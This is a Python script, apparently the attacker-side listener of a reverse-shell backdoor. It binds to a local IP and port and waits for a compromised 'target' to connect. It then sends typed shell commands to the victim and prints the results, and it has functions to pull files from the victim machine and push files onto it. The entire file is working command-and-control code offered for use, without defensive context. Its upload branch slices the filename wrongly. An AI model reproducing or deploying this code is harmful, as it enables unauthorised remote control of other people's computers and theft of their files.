import os
import socket
import json


def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())


def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def download_file(filename):
    f = open(filename, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        try:
            f.write(chunk)
            chunk = target.recv(1024)
        except socket.timeout:
            break
    target.settimeout(None)
    f.close()


def upload_file(filename):
    f = open(filename, 'rb')
    target.send(f.read())


def target_comunication():
    while True:
        command = input(f'* Shell~%{ip}: ')
        reliable_send(command)
        if command == 'quit':
            break
        elif command[:3] == 'cd ':
            pass
        elif command == 'clear':
            os.system(command)
        elif command[:9] == 'download ':
            download_file(command[9:])
        elif command[:7] == 'upload ':
            upload_file(command[:7])
        else:
            result = reliable_recv()
            print(result)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('192.168.1.34', 5555))
print('[+] Listening for incoming connections')
s.listen(5)
target, ip = s.accept()
print(f'[+] Target connected from: {ip}')
target_comunication()
